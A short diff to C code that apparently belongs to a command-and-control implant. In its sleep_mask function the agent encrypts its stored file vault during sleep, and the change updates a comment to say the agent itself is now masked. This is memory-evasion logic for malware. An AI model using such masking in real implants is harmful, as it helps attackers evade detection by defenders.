@@ -48,8 +48,9 @@ void sleep_mask(AgentState *state) {
 	// Mask vault.
 	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
 
-	// Sleep (TODO no logic for masking the agent itself)
+	// Mask agent and sleep...
 	mask_sleep_entrypoint(NULL, state->sleep_time, ENC_KEY, ENC_KEY_LEN);
+	
 	// Unmask vault.
 	if (state->sleep_time >= 3) { mask_vault_entrypoint(state->file_vault.data, state->file_vault.data_size, ENC_KEY, ENC_KEY_LEN); }
 	
